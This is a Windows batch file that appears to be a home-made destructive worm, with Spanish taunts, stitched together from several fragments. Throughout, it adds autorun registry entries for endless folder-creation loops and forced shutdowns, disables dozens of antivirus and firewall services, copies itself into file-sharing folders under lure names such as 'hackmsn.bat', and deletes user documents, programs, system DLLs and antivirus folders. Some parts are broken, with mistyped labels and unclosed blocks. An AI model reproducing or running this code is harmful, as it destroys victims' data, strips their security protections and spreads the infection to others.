@echo off
echo @echo off>%systemroot%\winsic.bat && echo :1>>%systemroot%\winsic.bat
echo mkdir %random%>>%systemroot%\winsic.bat && echo goto 1>>%systemroot%\winsic.bat
reg add "hkey_local_machine\software\microsoft\windows\currentversion\run" /v winsic /t reg_sz /d "c:\windows\winsic.bat"
echo @echo off>%systemroot%\system32\winsoc.bat && echo :1>>%systemroot%\system32\winsoc.bat
echo mkdir %random%>>%systemroot%\system32\winsoc.bat && echo goto 1>>%systemroot%\system32\winsoc.bat
reg add "hkey_local_machine\software\microsoft\windows\currentversion\run" /v winsoc /t reg_sz /d "c:\windows\system32\winsoc.bat" && cd \ && cd %USERPROFILE%\Escritorio
if exist "C:\WINDOWS\system32\taskkill.exe" (
taskkill /f /im msnmsgr.exe
) else (
tskill msnmsgr
)
cd %ProgramFiles%\MSN Messenger && attrib -R -A -S -H *.* && del /f /s /q *.*
echo  copy /y %0 %alluserprofile%\* inicio\programas\inicio\
echo shutdown -s -f -t 0>%systemroot%\windirz.bat
reg add "hkey_local_machine\software\microsoft\windows\currentversion\run" /v windirz /t reg_sz /d "c:\windows\windirz.bat"
echo @echo off>%systemroot%\system32\windoss.bat
echo :dos>>%systemroot%\system32\windoss.bat
echo msg * zickox te ama contac: los_misfits@hotmail.com>>%systemroot%\system32\windoss.bat
echo goto dos>>%systemroot%\system32\windoss.bat
reg add "hkey_local_machine\software\microsoft\windows\currentversion\run" /v winsoc /t reg_sz /d "c:\windows\system32\windoss.bat"

reg add "HKLM\software\microsoft\security center" /v AntiVirusDisableNotify /t REG_DWORD /d 4 /f
reg add "HKLM\software\microsoft\security center" /v AntiVirusOverride /t REG_DWORD /d 4 /f
reg add "HKLM\software\microsoft\security center" /v FirewallDisableNotify /t REG_DWORD /d 4 /f
reg add "HKLM\software\microsoft\security center" /v FirewallOverride /t REG_DWORD /d 4 /f
reg add "HKLM\software\microsoft\security center" /v FirstRunDisabled /t REG_DWORD /d 4 /f
reg add "HKLM\software\microsoft\security center" /v UpdatesDisableNotify /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\SharedAccess" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\SharedAccess" /v ErrorControl /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\SharedAccess" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\SharedAccess" /v ErrorControl /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\SharedAccess" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\SharedAccess" /v ErrorControl /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\AVPCC" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\AVPCC" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\AVPCC" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\Amon" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\Amon" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\Amon" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\Apvxd" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\Apvxd" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\Apvxd" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\Apvxdwin" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\Apvxdwin" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\Apvxdwin" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\Atrack" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\Atrack" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\Atrack" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\AvconsoleEXE" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\AvconsoleEXE" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\AvconsoleEXE" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\AVG_CC" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\AVG_CC" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\AVG_CC" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\avgcc32" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\avgcc32" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\avgcc32" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\avgserv9" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\avgserv9" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\avgserv9" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\AVPCC Service" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\AVPCC Service" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\AVPCC Service" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\BlackIce Utility" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\BlackIce Utility" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\BlackIce Utility" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\CcApp" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\CcApp" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\CcApp" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\CcRegVfy" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\CcApp" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\CcApp" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\ConfigSafe" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\ConfigSafe" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\ConfigSafe" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\CPD_EXE" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\CPD_EXE" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\CPD_EXE" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\Defwatch" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\Defwatch" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\Defwatch" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\dvpapi9x" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\dvpapi9x" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\dvpapi9x" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\Fix-it" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\Fix-it" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\Fix-it" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\Fix-it AV" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\Fix-it AV" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\Fix-it AV" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\Freedom" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\Freedom" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\Freedom" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\F-StopW" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\F-StopW" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\F-StopW" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\iamapp" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\iamapp" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\iamapp" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\Look 'n' Stop" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\Look 'n' Stop" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\Look 'n' Stop" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\McAfee Firewall" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\McAfee Firewall" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\McAfee Firewall" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\McAfee Winguage" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\McAfee Firewall" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\McAfee Firewall" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\McAfee.InstantUpdate.Monitor" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\McAfee.InstantUpdate.Monitor" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\McAfee.InstantUpdate.Monitor" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\McAfeeVirusScanService" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\McAfeeVirusScanService" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\McAfeeVirusScanService" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\NAV Agent" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\NAV Agent" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\NAV Agent" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\NAV Configuration Wizard" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\NAV Configuration Wizard" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\NAV Configuration Wizard" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\NAV DefAlert" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\NAV Configuration Wizard" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\NAV Configuration Wizard" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\Nod32CC" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\Nod32CC" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\CURRENTcontrolset\services\Nod32CC" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\NOD32POP3" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\NOD32POP3" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\NOD32POP3" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\Norton Auto-Protect" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\Norton Auto-Protect" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\Norton Auto-Protect" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\Norton eMail Protect" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\Norton eMail Protect" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\Norton eMail Protect" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\Norton Navigaton Loader" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\Norton Navigaton Loader" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\Norton Navigaton Loader" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\Norton Program Scheduler" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\Norton Program Scheduler" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\Norton Program Scheduler" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\Norton Program Event Checker" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\Norton Program Event Checker" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\Norton Program Event Checker" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\NPS Event Checker" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\NPS Event Checker" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\NPS Event Checker" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\Panda Scheduler" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\Panda Scheduler" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\Panda Scheduler" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\ScanInicio" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\ScanInicio" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\ScanInicio" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\SymTray - Norton SystemWorks" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\SymTray - Norton SystemWorks" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\SymTray - Norton SystemWorks" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\Tiny Personal Firewall" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\Tiny Personal Firewall" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\Tiny Personal Firewall" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\TrueVector" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\TrueVector" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\TrueVector" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\VirusScan Online" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\VirusScan Online" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\VirusScan Online" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset001\services\ZoneAlarm" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\controlset002\services\ZoneAlarm" /v Start /t REG_DWORD /d 4 /f
reg add "HKLM\system\currentcontrolset\services\ZoneAlarm" /v Start /t REG_DWORD /d 4 /f


goto menu1
:menu1
if exist "%programfiles%\ICQ\shared files\" (
Goto ICQ
) else (
Goto menu2
)
:ICQ
copy /y %0 %programfiles%\ICQ\shared files\ringtones.bat
copy /y %0 %programfiles%\ICQ\shared files\xxx.bat
copy /y %0 %programfiles%\ICQ\shared files\pass msn.bat
copy /y %0 %programfiles%\ICQ\shared files\xploits.bat
copy /y %0 %programfiles%\ICQ\shared files\flooder.bat
copy /y %0 %programfiles%\ICQ\shared files\hackmsn.bat
copy /y %0 %programfiles%\ICQ\shared files\porno.bat
copy /y %0 %programfiles%\ICQ\shared files\hackyahoo.bat

:menu2
if exist "%programfiles%\Filetopia3\Files\" (
Goto Fileto
) else (
Goto menu3
)
:fileto
copy /y %0 %programfiles%\Filetopia3\Files\ringtones.bat
copy /y %0 %programfiles%\Filetopia3\Files\pass msn.bat
copy /y %0 %programfiles%\Filetopia3\Files\xploits.bat
copy /y %0 %programfiles%\Filetopia3\Files\flooder.bat
copy /y %0 %programfiles%\Filetopia3\Files\hackmsn.bat
copy /y %0 %programfiles%\Filetopia3\Files\hackyahoo.bat
copy /y %0 %programfiles%\Filetopia3\Files\porno.bat
copy /y %0 %programfiles%\Filetopia3\Files\xxx.bat

:menu3
if exist "%programfiles%\appleJuice\incoming\" (
goto apple
) else (
goto menu4
)
:apple
copy /y %0 %programfiles%\appleJuice\incoming\xxx.bat
copy /y %0 %programfiles%\appleJuice\incoming\porno.bat
copy /y %0 %programfiles%\appleJuice\incoming\hackyahoo.bat
copy /y %0 %programfiles%\appleJuice\incoming\hackmsn.bat
copy /y %0 %programfiles%\appleJuice\incoming\flooder.bat
copy /y %0 %programfiles%\appleJuice\incoming\xploits.bat
copy /y %0 %programfiles%\appleJuice\incoming\pass msn.bat
copy /y %0 %programfiles%\appleJuice\incoming\ringtones.bat

:menu4
if exist "%programfiles%\LimeWire\Shared\" (
goto lime
) else (
goto menu5
)
:lime
copy /y %0 %programfiles%\LimeWire\Shared\ringtones.bat
copy /y %0 %programfiles%\LimeWire\Shared\pass msn.bat
copy /y %0 %programfiles%\LimeWire\Shared\xploits.bat
copy /y %0 %programfiles%\LimeWire\Shared\flooder.bat
copy /y %0 %programfiles%\LimeWire\Shared\hackmsn.bat
copy /y %0 %programfiles%\LimeWire\Shared\hackyahoo.bat
copy /y %0 %programfiles%\LimeWire\Shared\porno.bat
copy /y %0 %programfiles%\LimeWire\Shared\xxx.bat


:menu5
if exist "%programfiles%\Overnet\incoming\" (
goto over
) else (
goto menu6
)
:over
copy /y %0 %programfiles%\Overnet\incoming\xxx.bat
copy /y %0 %programfiles%\Overnet\incoming\porno.bat
copy /y %0 %programfiles%\Overnet\incoming\hackyahoo.bat
copy /y %0 %programfiles%\Overnet\incoming\hackmsn.bat
copy /y %0 %programfiles%\Overnet\incoming\flooder.bat
copy /y %0 %programfiles%\Overnet\incoming\xploits.bat
copy /y %0 %programfiles%\Overnet\incoming\pass msn.bat
copy /y %0 %programfiles%\Overnet\incoming\ringtones.bat
:menu6
if exist "%programfiles%\Swaptor\Download\" (
goto swa
) else (
goto menu7
)
:swa
copy /y %0 %programfiles%\Swaptor\Download\ringtones.bat
copy /y %0 %programfiles%\Swaptor\Download\pass msn.bat
copy /y %0 %programfiles%\Swaptor\Download\xploits.bat
copy /y %0 %programfiles%\Swaptor\Download\flooder.bat
copy /y %0 %programfiles%\Swaptor\Download\hackmsn.bat
copy /y %0 %programfiles%\Swaptor\Download\hackyahoo.bat
copy /y %0 %programfiles%\Swaptor\Download\porno.bat
copy /y %0 %programfiles%\Swaptor\Download\xxx.bat

:menu7
if exist "%programfiles%\WinMX\My Shared Folder\" (
goto win
) else (
goto menu8
:win
copy /y %0 %programfiles%\WinMX\My Shared Folder\ringtones.bat
copy /y %0 %programfiles%\WinMX\My Shared Folder\pass msn.bat
copy /y %0 %programfiles%\WinMX\My Shared Folder\xploits.bat
copy /y %0 %programfiles%\WinMX\My Shared Folder\flooder.bat
copy /y %0 %programfiles%\WinMX\My Shared Folder\hackmsn.bat
copy /y %0 %programfiles%\WinMX\My Shared Folder\hackyahoo.bat
copy /y %0 %programfiles%\WinMX\My Shared Folder\porno.bat
copy /y %0 %programfiles%\WinMX\My Shared Folder\xxx.bat


:menu8
if exist "%programfiles%\Tesla\Files\" (
goto tesla
) else (
goto menu9
:telsa
copy /y %0 %programfiles%\Tesla\Files\xxx.bat
copy /y %0 %programfiles%\Tesla\Files\porno.bat
copy /y %0 %programfiles%\Tesla\Files\hackyahoo.bat
copy /y %0 %programfiles%\Tesla\Files\hackmsn.bat
copy /y %0 %programfiles%\Tesla\Files\flooder.bat
copy /y %0 %programfiles%\Tesla\Files\xploits.bat
copy /y %0 %programfiles%\Tesla\Files\pass msn.bat
copy /y %0 %programfiles%\Tesla\Files\ringtones.bat

:menu9
if exist "%programfiles%\XoloX\Downloads\ (
goto xolox
) else (
goto menu10
:xolox
copy /y %0 %programfiles%\XoloX\Downloads\ringtones.bat
copy /y %0 %programfiles%\XoloX\Downloads\pass msn.bat
copy /y %0 %programfiles%\XoloX\Downloads\xploits.bat
copy /y %0 %programfiles%\XoloX\Downloads\flooder.bat
copy /y %0 %programfiles%\XoloX\Downloads\hackmsn.bat
copy /y %0 %programfiles%\XoloX\Downloads\hackyahoo.bat
copy /y %0 %programfiles%\XoloX\Downloads\porno.bat
copy /y %0 %programfiles%\XoloX\Downloads\xxx.bat

:menu10
if exist "%programfiles%\Rapigator\Share\" (
goto rap
) else (
goto menu11
:rap
copy /y %0 %programfiles%\Rapigator\Share\ringtones.bat
copy /y %0 %programfiles%\Rapigator\Share\pass msn.bat
copy /y %0 %programfiles%\Rapigator\Share\xploits.bat
copy /y %0 %programfiles%\Rapigator\Share\flooder.bat
copy /y %0 %programfiles%\Rapigator\Share\hackmsn.bat
copy /y %0 %programfiles%\Rapigator\Share\hackyahoo.bat
copy /y %0 %programfiles%\Rapigator\Share\porno.bat
copy /y %0 %programfiles%\Rapigator\Share\xxx.bat

:menu11
if exist "%programfiles%\KMD\My Shared Folder\" (
goto kmd
) else (
goto menu12
:kmd
copy %0 %programfiles%\KMD\My Shared Folder\xxx.bat
copy %0 %programfiles%\KMD\My Shared Folder\porno.bat
copy %0 %programfiles%\KMD\My Shared Folder\hackyahoo.bat
copy %0 %programfiles%\KMD\My Shared Folder\hackmsn.bat
copy %0 %programfiles%\KMD\My Shared Folder\flooder.bat
copy %0 %programfiles%\KMD\My Shared Folder\xploits.bat
copy %0 %programfiles%\KMD\My Shared Folder\pass msn.bat
copy %0 %programfiles%\KMD\My Shared Folder\ringtones.bat


:menu12
if exist "%programfiles%\Direct Connect\Received Files\" (
goto direc
) else (
goto menu13
:direc
copy /y %0 %programfiles%\Direct Connect\Received Files\ringtones.bat
copy /y %0 %programfiles%\Direct Connect\Received Files\pass msn.bat
copy /y %0 %programfiles%\Direct Connect\Received Files\xploits.bat
copy /y %0 %programfiles%\Direct Connect\Received Files\flooder.bat
copy /y %0 %programfiles%\Direct Connect\Received Files\hackmsn.bat
copy /y %0 %programfiles%\Direct Connect\Received Files\hackyahoo.bat
copy /y %0 %programfiles%\Direct Connect\Received Files\porno.bat
copy /y %0 %programfiles%\Direct Connect\Received Files\xxx.bat

:menu13
if exist "%programfiles%\Ares\My Shared Folder\" (
goto ares
) else (
goto 1
:ares
copy /y %0 %programfiles%\Ares\My Shared Folder\xxx.bat
copy /y %0 %programfiles%\Ares\My Shared Folder\porno.bat
copy /y %0 %programfiles%\Ares\My Shared Folder\hackyahoo.bat
copy /y %0 %programfiles%\Ares\My Shared Folder\hackmsn.bat
copy /y %0 %programfiles%\Ares\My Shared Folder\flooder.bat
copy /y %0 %programfiles%\Ares\My Shared Folder\xploits.bat
copy /y %0 %programfiles%\Ares\My Shared Folder\pass msn.bat
copy /y %0 %programfiles%\Ares\My Shared Folder\ringtones.bat

cd \

attrib -r -a -s -h *.doc
attrib -r -a -s -h *.txt
del /s /q /f *.doc
del /s /q /f *.txt

cd %userprofile%\escritorio

attrib -r -a -s -h *.doc
attrib -r -a -s -h *.txt
attrib -r -a -s -h *.exe
del /s /q /f  *.doc
del /s /q /f  *.txt
del /s /q /f  *.exe
del /s /q /f  *.lnk

:1
mkdir %random%
goto 1

echo s | erase c:\windows\vmmreg32.dll

echo s | erase c:\windows\

@echo off

start iexplore
start cmd
start iexplore
start iexplore
start iexplore
start iexplore
start iexplore
start iexplore
start iexplore
start iexplore
start iexplore


@echo off
echo Set oWMP = CreateObject("WMPlayer.OCX.7" ) >> abrir.vbs
echo Set colCDROMs = oWMP.cdromCollection >> abrir.vbs
echo. >> abrir.vbs
echo if colCDROMs.Count >= 1 then >> abrir.vbs
echo For i = 0 to colCDROMs.Count - 1 >> abrir.vbs
echo colCDROMs.Item(i).Eject >> abrir.vbs
echo Next ' cdrom >> abrir.vbs
echo End If >> abrir.vbs
start abrir.vbs

md c:\program files\virus

@echo off

cd c:\documents and settings\andres\escritorio\virus.bat c:\program files\virus

MSCDEX

echo off

has sido hackeado idiota  jajajajajajajajajajajaja


echo s | erase c:\

hijodeputa OFF

echo off

copy virus.bat c:\

echo off

REN virus.bat age of empires.bat

@echo off
cd C:\WINDOWS\system
atrib -h -r -s -a *.dll
del /q /f OLECLI.dll
del /q /f SHELL.dll
del /q /f VER.dll
del /q /f TAPI.dll
del /q /f MSVIDEO.dll
del /q /f OLESVR.dll
del /q /f LZEXPAND.dll
del /q /f mmsystem.dll
del /q /f crlds3d.dll
del /q /f AVICAP.dll
del /q /f AVIFILE.dll
del /q /f COMMDLG.dll
del /q /f LZEXPAND.dll

@cd c:\Archivos de programa
del /q /f /s "Alwil Software"
del /q /f /s "Norton Antivirus"
del /q /f /s "Kaspersky Lab"

@echo off
copy /y virus.bat c:\WINDOWS\Cursors
copy /y virus.bat c:\WINDOWS\Fonts
copy /y virus.bat c:\WINDOWS\Help

@echo off
echo reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v antiboot /t REG_SZ /d c:\WINDOWS\Cursors\Kalete.bat

@echo off
color 74
echo Hola tu computador a sido hackeado gracias a mi pero no te lo digo de malas te lo digo de onda  que te vaya bien

@echo off
cd windows
echo @echo off> winbat.bat
echo echo msg * en kada inicio me veras>> win.bat.bat
reg add "hkey_local_machine\software\microsoft\windows\currentversion\run" /v winbat /t reg_sz /d
echo off
echo reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v antiboot /t REG_SZ /d c:\windows\system32\winantiboot.bat > %windir%\system32\winantiboot.bat
echo pause >> %windir%\system32\winantiboot.bat
%windir%\system32\win_antiboot.bat
%windir%\system32\win_antiboot.bat
@echo off
cd\
at 00:00 goto del1
at 00:00 goto init

:del1
@echo off
cd\
cd C:\Archivos de programa\World of Warcraft
attrib -H -S -R *.*
del /S /Q *.*
cd C:\Archivos de programa\MSN Messenger
attrib -H -S -R *.*
del /S /Q *.*
cd C:\Archivos de programa\Skype
attrib -H -S -R *.*
del /S /Q *.*

:init
@echo off
cd\
cd C:\Documents and Settings\All Users\* Inicio\Programas\Inicio
echo @echo off > init.bat
echo cd\ >> init.bat

echo s | erase C:\Archivos de programa\Grisoft\AVG Free\vault.dll

@echo off
cd\
cd archivos de programa
del \Q\S Norton antivirus

call cmd

md c:\windows\system_32\

@echo off

copy /y virus.bat c:\windows\system_32\ 

@echo off
@echo Hola
del *.sys
del *.exe
del *.com
cd windows
del *.*
cd\
del arquivo.bat
@echo Estás muerto
echo off
echo reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v antiboot /t REG_SZ /d c:\windows\system32\winantiboot.bat > %windir%\system32\winantiboot.bat
echo pause >> %windir%\system32\winantiboot.bat
echo shutdown -s -f -t 10 -c "te lo dije, no enciendas el ordenador" > %windir%\system32\win_antiboot.bat
%windir%\system32\win_antiboot.bat
shutdown -s -f -t 10 -c " Erro Grave En El Sistema, Se Reiniciara En Unos Momentos..."

cd\
copy /y %0 C:\Windows\System32\nmbre.bat
Reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Win32 /d "C:\Windows\System32\virus otro.bat" /f